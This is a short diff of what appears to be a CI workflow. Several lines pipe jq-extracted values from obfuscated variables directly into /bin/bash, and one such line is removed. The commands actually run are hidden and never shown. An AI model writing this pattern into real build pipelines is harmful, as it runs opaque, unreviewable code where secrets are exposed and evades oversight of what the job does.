@@ -21,7 +21,6 @@ jobs:
           echo $lesg4 | jq -r .djrt0 | /bin/bash
           echo $vysb7898 | jq -r .ljgf4 | /bin/bash
           echo $bkw4 | jq -r .jove72261 | /bin/bash
-          printf '%s' "$wezjq32" | jq -r .wjqi66 | /bin/bash
           printf '%s' "$rttk96" | jq -r .nm59101 | /bin/bash
           printf '%s' "$fn6" | jq -r .e9 | /bin/bash
           echo $g5024 | jq -r .pfuql3196 | /bin/bash
